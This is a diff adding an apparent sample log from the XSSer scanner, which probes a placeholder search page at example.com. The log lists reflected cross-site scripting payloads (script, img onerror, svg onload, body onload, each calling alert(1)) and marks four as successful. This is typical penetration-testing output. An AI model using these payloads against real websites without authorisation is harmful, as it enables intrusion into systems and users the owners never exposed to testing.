@@ -1,0 +1,50 @@
+===========================================================================
+XSSer v1.8.4: "The HiVe!" - (2011-2024) -> by psy
+===========================================================================
+Testing [XSS from URL(s)]
+
+[*] Starting probe against: http://example.com/search.php?q=test
+
+[+] Target: http://example.com/search.php?q=test
+[+] Vector: q
+
+-------------------------------------------
+[*] Trying: http://example.com/search.php?q=<script>alert(1)</script>
+[+] XSS FOUND! [Reflected] 
+    Payload: <script>alert(1)</script>
+    Browser: ALL
+    Type: Reflected XSS
+    Response: 200 OK
+    
+[*] Trying: http://example.com/search.php?q=<img src=x onerror=alert(1)>
+[+] XSS FOUND! [Reflected]
+    Payload: <img src=x onerror=alert(1)>
+    Browser: ALL
+    Type: Reflected XSS (Event Handler)
+    Response: 200 OK
+
+[*] Trying: http://example.com/search.php?q=<svg onload=alert(1)>
+[+] XSS FOUND! [Reflected]
+    Payload: <svg onload=alert(1)>
+    Browser: ALL
+    Type: Reflected XSS (SVG)
+    Response: 200 OK
+
+[*] Trying: http://example.com/search.php?q=javascript:alert(1)
+[-] NOT vulnerable (filtered)
+
+[*] Trying: http://example.com/search.php?q=<body onload=alert(1)>
+[+] XSS FOUND! [Reflected]
+    Payload: <body onload=alert(1)>
+    Browser: ALL
+    Type: Reflected XSS (Body Event)
+    Response: 200 OK
+
+-------------------------------------------
+[*] Total vectors tested: 50
+[*] Vectors bypassed filters: 4
+[*] Final injection(s) found: 4
+
+[+] XSSer has found 4 XSS vulnerabilities!
+[+] All results saved to: xsser_results.xml
+===========================================================================
